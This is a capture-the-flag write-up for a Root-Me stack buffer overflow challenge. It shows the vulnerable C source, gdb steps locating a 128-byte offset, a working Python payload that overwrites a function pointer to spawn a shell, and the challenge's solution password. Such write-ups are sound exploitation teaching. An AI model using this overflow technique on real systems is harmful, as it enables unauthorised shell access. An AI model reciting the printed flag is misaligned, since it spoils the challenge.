# ELF x86 - Stack buffer overflow basic 2
- Point: 10pts
- Author: [Lyes](https://www.root-me.org/Lyes?lang=en), 10 April 2015
- Level: Very Easy <br><br>
![image](https://user-images.githubusercontent.com/48288606/141502136-47d2b4bd-50fe-47af-80a9-e3c294bfbf01.png)

## Write-up:
Code:
```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
void shell() {
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
}
 
void sup() {
    printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
}
 
void main()
{
    int var;
    void (*func)()=sup;
    char buf[128];
    fgets(buf,133,stdin);
    func();
}
```


- As a normal code flow, the program will point to the address of **sup()** function and execute it. Using gdb and disassembler the **main()** function and save the address of **shell (0x08048516)** <br>
- `void (*func)()=sup;` is a declaration of a function pointer and point to **sup** function. We can overflow **buffer** to overwrite this pointer and point again to **shell** function.


![image](https://user-images.githubusercontent.com/48288606/146747232-e78b70c2-9af0-413a-a20d-2b39be64cf96.png)
 
- Set breakpoint at **fgets function**. Run the program
```
gdb-peda$ b*main+0
Breakpoint 1 at 0x8048584
```

-  Input `aaaaaaaa`and watch the value. 

![image](https://user-images.githubusercontent.com/48288606/146749346-4e182441-effa-4519-8d5a-09a2d4452c7a.png)

- Our input's at **0xbffffa9c**. Now watch the return address of **sup function**.

![image](https://user-images.githubusercontent.com/48288606/146752691-aa64fb0d-7b34-4ea0-ab63-1097ee23671f.png)


- **sup** is at **0xbffffb1c**. Calculate the distance from **buffer** to address of **sup** function.
```
gdb-peda$ p/d 0xbffffb1c-0xbffffa9c
$5 = 128
```

### Solution:
- First we will fill the **buf**'s value with 128 "A" characters, and then push the address of the **shell()** function. <br>
Payload: `(python -c "print('a'*128+'\x16\x85\x04\x08')";cat) | ./ch15` <br>
Password: B33r1sSoG0oD4y0urBr4iN

